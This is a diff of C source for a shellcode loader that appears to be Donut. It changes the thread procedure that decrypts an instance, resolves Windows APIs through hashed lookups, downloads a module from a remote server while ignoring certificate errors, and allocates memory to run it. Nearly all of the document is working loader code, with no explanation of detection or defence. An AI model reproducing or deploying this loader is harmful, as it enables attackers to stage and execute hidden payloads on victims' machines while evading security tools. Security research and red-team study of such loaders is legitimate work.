@@ -34,12 +34,19 @@
 DWORD ThreadProc(LPVOID lpParameter) {
     DWORD           i;
     PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
+    PBYTE           data;
+    PDONUT_CRYPT    crypt;
+    
+    crypt = (PDONUT_CRYPT)&inst->Key;
+    data  = (PBYTE)inst;
+    data += sizeof(DONUT_CRYPT) + sizeof(DWORD);
     
     // decrypt instance
+    decrypt(crypt->key, crypt->ctr, data, inst->dwLen);
     
     // if this is a test, don't run an instance where
     // the module resides in the resource section of DLL
-#ifdef TEST
+#ifdef DEBUG
     if(inst->dwType == DONUT_INSTANCE_DLL) {
       printf("  [ this instance is for DLL only. Cannot run.\n");
       return -1;
@@ -47,7 +54,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
 #endif
     // load required DLL
     DPRINT("Resolving LoadLibraryA");
-    inst->api.addr[0] = xGetProcAddress(inst->api.hash[0], inst->iv);
+    inst->api.addr[0] = xGetProcAddress(inst->api.hash[0], inst->ulIV);
     if(inst->api.addr[0] == NULL) return -1;
     
     DPRINT("Loading DLL");
@@ -58,7 +65,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     DPRINT("Resolving %i API", inst->ApiCount);
     for(i=1;i<inst->ApiCount;i++) {
      // DPRINT("#%i API : %p", i, inst->api.hash[i]);
-      inst->api.addr[i] = xGetProcAddress(inst->api.hash[i], inst->iv);
+      inst->api.addr[i] = xGetProcAddress(inst->api.hash[i], inst->ulIV);
       if(inst->api.addr[i] == NULL) {
         DPRINT("unable to resolve address for hash %i : %p", 
           i, (void*)inst->api.hash[i]);
@@ -75,6 +82,9 @@ DWORD ThreadProc(LPVOID lpParameter) {
       DPRINT("Instance is URL");
       if(!LoadFromServer(inst)) return -1;
     }
+    
+    // decrypt module information
+    //decrypt();
     
     // verify integrity of assembly
     DPRINT("Verifying assembly");
@@ -155,7 +165,7 @@ BOOL VerifyAssembly(PDONUT_INSTANCE inst) {
                 inst->ModuleLen - DONUT_SIG_LEN);
                 
               p = (PBYTE)pModule;
-              p += DONUT_SIG_LEN;
+              p += DONUT_SIG_LEN + sizeof(DWORD);
               
               if(inst->api.CryptHashData(
                 hash, p, 
@@ -169,7 +179,8 @@ BOOL VerifyAssembly(PDONUT_INSTANCE inst) {
                   DONUT_SIG_LEN, 
                   pubkey, NULL, 0);
                   
-                DPRINT("Verified : %s", bVerified ? "OK" : "FAILED");
+                DPRINT("Verified : %s", 
+                  bVerified ? "OK" : "FAILED");
               }
               inst->api.CryptDestroyHash(hash);
             }
@@ -200,10 +211,10 @@ BOOL LoadFromServer(PDONUT_INSTANCE inst) {
                     file[DONUT_MAX_URL];
     
     // default flags for HTTP client
-    DWORD flags = INTERNET_FLAG_KEEP_CONNECTION          | 
-                  INTERNET_FLAG_NO_CACHE_WRITE           | 
-                  INTERNET_FLAG_NO_UI                    |
-                  INTERNET_FLAG_RELOAD                   |
+    DWORD flags = INTERNET_FLAG_KEEP_CONNECTION   | 
+                  INTERNET_FLAG_NO_CACHE_WRITE    | 
+                  INTERNET_FLAG_NO_UI             |
+                  INTERNET_FLAG_RELOAD            |
                   INTERNET_FLAG_NO_AUTO_REDIRECT;
     
     memset((void*)&uc, 0, sizeof(uc));
@@ -264,6 +275,7 @@ BOOL LoadFromServer(PDONUT_INSTANCE inst) {
         if(bSecure) {
           if(flags & INTERNET_FLAG_IGNORE_CERT_CN_INVALID) {
             n = sizeof (s);
+            
             s = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                 SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                 SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
@@ -287,6 +299,7 @@ BOOL LoadFromServer(PDONUT_INSTANCE inst) {
           len  = sizeof(DWORD);
           code = 0;
           DPRINT("Querying status code");
+          
           if(inst->api.HttpQueryInfo(
               req, 
               HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, 
@@ -298,6 +311,7 @@ BOOL LoadFromServer(PDONUT_INSTANCE inst) {
               len               = sizeof(SIZE_T);
               inst->ModuleLen = 0;
               DPRINT("Querying content length");
+              
               if(inst->api.HttpQueryInfo(
                 req, 
                 HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, 
@@ -306,6 +320,7 @@ BOOL LoadFromServer(PDONUT_INSTANCE inst) {
                 if(inst->ModuleLen != 0) {
                   // 9. allocate RW memory for file
                   DPRINT("Allocating memory for module");
+                  
                   inst->Assembly.p = inst->api.VirtualAlloc(
                     NULL, inst->ModuleLen, 
                     MEM_COMMIT | MEM_RESERVE, 
@@ -566,20 +581,18 @@ LPVOID FindExport(LPVOID base, ULONG64 ulAPIHash, ULONG64 iv){
     ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
     dll = RVA2VA(PCHAR, base, exp->Name);
     
-    // get hash of DLL converted to lowercase
+    // get hash of DLL string converted to lowercase
     for(i=0;dll[i]!=0;i++) {
       buf[i] = dll[i] | 0x20;
     }
     buf[i] = 0;
     ulDllHash = maru(buf, iv);
-    //DPRINT("DLL : %s : %p", buf, (void*)ulDllHash);
-    
+
     do {
       // calculate hash of api string
       api = RVA2VA(PCHAR, base, sym[cnt-1]);
       // add to DLL hash and compare with hash to find
       if ((maru(api, iv) + ulDllHash) == ulAPIHash) {
-        //DPRINT("Found match with %s", api);
         // return address of function
         addr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
         return addr;
@@ -642,7 +655,7 @@ LPVOID xGetProcAddress(ULONG64 ulHash, ULONG64 ulIV) {
 
 // the following code is *only* for development purposes
 // given an instance file, it will run as if running on a target system
-#ifdef TEST
+#ifdef DEBUG
 
 #include <stdio.h>
 #include <string.h>
@@ -678,6 +691,7 @@ int main(int argc, char *argv[]) {
 
     // allocate memory
     inst = (PDONUT_INSTANCE)malloc(fs.st_size);
+    
     if(inst != NULL) {
       fread(inst, 1, fs.st_size, fd);
       // run payload with instance
